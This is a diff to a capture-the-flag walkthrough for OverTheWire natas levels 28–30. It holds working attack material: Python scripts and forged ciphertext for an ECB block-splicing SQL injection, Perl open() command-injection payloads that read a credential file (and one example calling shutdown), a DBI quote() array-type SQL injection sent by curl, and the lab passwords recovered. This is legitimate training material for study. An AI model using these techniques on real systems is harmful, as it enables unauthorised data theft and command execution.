@@ -2067,7 +2067,7 @@ JWwR438wkgTsNKBbcJoowyysdM82YjeF )
 
 ### natas28
 
-When I search with fixed value `query=a`, the response generate random 3 sentences, look like that:
+When I search with fixed value `query=a`, the response generate random 3 sentences (maybe `LIMIT 3` in SQL), look like that:
 
 ```
 Whack Computer Joke Database
@@ -2079,6 +2079,18 @@ Whack Computer Joke Database
     A: A terminal illness!
 ```
 
+Try search with another query value, such as: `query=aaaaa`, we don't have anything in the response. Maybe there is no `aaaaa` string in the SQL databse.
+
+Try repeat search with unique query value, such as: `query=illness`, we have only 1 sentence:
+
+```
+Q: What is a computer virus?
+A: A terminal illness!
+```
+
+Hmm, maybe this challenge used query `SELECT joke from database WHERE joke LIKE '%<input>%'` and show result in browser. This query will finds any values that have "<input>" in any position. So we can use `UNION` operator to combine the result-set of two `SELECT` statements, one is my SQL injection.
+
+
 But the parameter in URL `?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D` look like cipher based base64 encode.
 
 If I remove some characters in parameter `query`, I got the following error: `Incorrect amount of PKCS#7 padding for blocksize` -> this is invalid paddding in block cipher, read [ECB](https://github.com/hoangph3/web-security/blob/main/crypto/README.md) first.
@@ -2088,7 +2100,7 @@ First, we need brute-force to find block size.
 ```python
 #!/usr/bin/python3
 import requests
-import urlparse
+from urllib.parse import urlparse, unquote
 
 url = "http://natas28.natas.labs.overthewire.org/index.php"
 auth_username = "natas28"
@@ -2099,7 +2111,7 @@ text = 'a'
 while len(text) < 50:
     data = {"query": text}
     r = requests.post(url, data=data, auth=(auth_username,auth_password))
-    print("len:{}\tcipher:{}".format(len(text), urlparse.unquote(r.url.split('=')[-1])))
+    print("len:{}\tcipher:{}".format(len(text), unquote(r.url.split('=')[-1])))
     text += 'a'
 ```
 
@@ -2131,7 +2143,7 @@ Then, we need brute-force to find byte offset.
 ```python
 #!/usr/bin/python3
 import requests
-import urlparse
+from urllib.parse import urlparse, unquote
 import base64
 
 url = "http://natas28.natas.labs.overthewire.org/index.php"
@@ -2146,7 +2158,7 @@ pad = 'b'
 for l in range(1, block_size):
     data = {"query": pad * l + text}
     r = requests.post(url, data=data, auth=(auth_username,auth_password))
-    cipher = urlparse.unquote(r.url.split('=')[-1])
+    cipher = unquote(r.url.split('=')[-1])
     cipher = base64.b64decode(cipher).encode("hex")
     cipher_block = [cipher[i:i+block_size*2] for i in range(0, len(cipher), block_size*2)] #because 1 ascii byte = 2 hex bytes.
 
@@ -2176,7 +2188,188 @@ b39038c28df79b65d26151df58f7eaa3 -> aaaaaaaaaaaaaaaa
 f34df339c69edce11f6650bbced62702 -> ????????????????
 ```
 
--> The payload plain text start from 16 - 10 + 1 = 7th byte of 3rd block with len(padding) = 10.
+-> The payload plain text start from 16 - 10 + 1 = 7th byte of 3rd block with len(padding) = 10. We also have `prefix` and `postfix`.
 
-The challenge related to Database, i think we can use SQL injection. However, we need padding first to fill 3rd block.
+```
+1be82511a7ba5bfd578c0eef466db59c -> prefix
+dc84728fdcf89d93751d10a7c75c8cf2 -> prefix
+5c805cbd29fb63e2ec53645325c7a896 -> padding (??????bbbbbbbbbb)
+block 4th                        -> maybe inject sql here
+block 5th                        -> maybe inject sql here
+...
+738a5ffb4a4500246775175ae596bbd6 -> postfix
+f34df339c69edce11f6650bbced62702 -> postfix
+```
 
+Attention, if payload = 12 * 'a' we have 5 blocks, but if payload = 13 * 'a' we have 6 blocks -> The last block contain 1 bits end and 15 bits padding (full padding).
+
+```
+1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
+dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
+c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
+ce82a9553b65b81280fb6d3bf2900f47 -> 2 bits 'a' + 14 bits end
+75fd5044fd063d26f6bb7f734b41c899 -> 16 bits end
+```
+
+```
+1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
+dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
+c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
+1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end
+6223a14d9c4291b98775b03fbc73d4ed -> 16 bits
+d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
+```
+
+We will use SQL query `aaaaaaaaaaSELECT * FROM users WHERE 1 # aaaaa` to fill into cipher from block 4.
+
+```
+1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
+dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
+c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
+f79abe47a81b677079ea13336070464a -> SELECT * FROM us (16 chars <-> 16 bits)
+b548369a817a2746d70614dc0dcf63d5 -> ers WHERE 1 # aa (16 chars <-> 16 bits, need padding 2 bits 'a')
+1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end (need padding 3 bits 'a')
+6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
+d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
+```
+
+We split cipher to get valid SQL query look like that:
+
+```
+f79abe47a81b677079ea13336070464a -> SELECT * FROM us (16 chars <-> 16 bits)
+b548369a817a2746d70614dc0dcf63d5 -> ers WHERE 1 # aa (16 chars <-> 16 bits, need padding 2 bits 'a')
+1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end (need padding 3 bits 'a')
+6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
+d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
+```
+
+Decode cipher: `f79abe47a81b677079ea13336070464ab548369a817a2746d70614dc0dcf63d51f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98`
+
+We get base64 url query:
+`95q%2BR6gbZ3B56hMzYHBGSrVINpqBeidG1wYU3A3PY9UfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D`
+
+Request GET from: `http://natas28.natas.labs.overthewire.org/search.php/?query=95q%2BR6gbZ3B56hMzYHBGSrVINpqBeidG1wYU3A3PY9UfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D`, we get response:
+
+```
+Notice: Undefined index: joke in /var/www/natas/natas28/search.php on line 92
+```
+
+We can see SQL query is working, but we need to change query a bit, look like `aaaaaaaaaaSELECT password AS joke from users WHERE 1 # aaaaaa`
+
+```
+1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
+dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
+c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
+5b8ac3d259f2d7ab9ba3fac39824b10a -> SELECT password 
+d06f8990367940a4f964783862394d6b -> AS joke from use
+c7ddf69db1b142b2caa52da41350d657 -> rs WHERE 1 # aaa
+1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end
+6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
+d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
+```
+
+Force split cipher to get valid query:
+
+```
+5b8ac3d259f2d7ab9ba3fac39824b10a -> SELECT password 
+d06f8990367940a4f964783862394d6b -> AS joke from use
+c7ddf69db1b142b2caa52da41350d657 -> rs WHERE 1 # aaa
+1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end
+6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
+d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
+```
+
+Decode cipher:
+`5b8ac3d259f2d7ab9ba3fac39824b10ad06f8990367940a4f964783862394d6bc7ddf69db1b142b2caa52da41350d6571f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98`
+
+We get base64 url query:
+`W4rD0lny16ubo%2FrDmCSxCtBviZA2eUCk%2BWR4OGI5TWvH3fadsbFCssqlLaQTUNZXH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY`
+
+Request GET from: `http://natas28.natas.labs.overthewire.org/search.php/?query=W4rD0lny16ubo%2FrDmCSxCtBviZA2eUCk%2BWR4OGI5TWvH3fadsbFCssqlLaQTUNZXH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY`, we get response:
+
+`airooCaiseiyee8he8xongien9euhe8b`
+
+### natas29
+
+This is perl command injection, open() function is vulnerable and can be used to execute commands, such as: `"| shutdown -r |"`. So we can send a payload: `?file=|ls` but it's not working.
+
+Try change payload to: `?file|ls%0D%0A`, `?file|ls%0D`, `?file|ls%0A`, ... by using CRLF, we can see the response:
+
+```
+ index.html.tmpl index.pl index.pl.tmpl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
+```
+
+Next, we use payload: `?file|cat+index.pl%0A` and get the response:
+
+```php
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+```
+
+We need get the content of `/etc/natas_webpass/natas30`. If you use payload" `?file=|cat+/etc/natas_webpass/natas30%0A`, the response is `meeeeeep! (see in source code).
+
+We can bypass by using payload: `?file=|cat+/etc/na%27%27tas_webpass/na%27%27tas30%0A`.
+
+```
+wie9iexae0Daihohv8vuu3cei9wahf0e
+```
+
+### natas30
+
+```php
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+```
+
+The `quote` method is secure if used properly. However, if the data type is a non-string type like NUMERIC, then quote will pass its first argument through without any quoting. This constitutes an opportunity for SQL injection.
+
+So, we will supply an array instead of a string, the first element of the array will be our injection string, the second element will be in the type of NUMERIC. Then the Perl back-end will pass our injection without any applying any filtering and our injection will work, look like: `Select * FROM users where username=natas31 and password='' or 1`.
+
+```shell
+curl -X POST -d "username=natas31" -d "password='' or 1" -d "password=2" --user natas30:wie9iexae0Daihohv8vuu3cei9wahf0e http://natas30.natas.labs.overthewire.org/index.pl
+```
+
+```
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+win!<br>here is your result:<br>natas31hay7aecuungiuKaezuathuk9biin0pu1<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
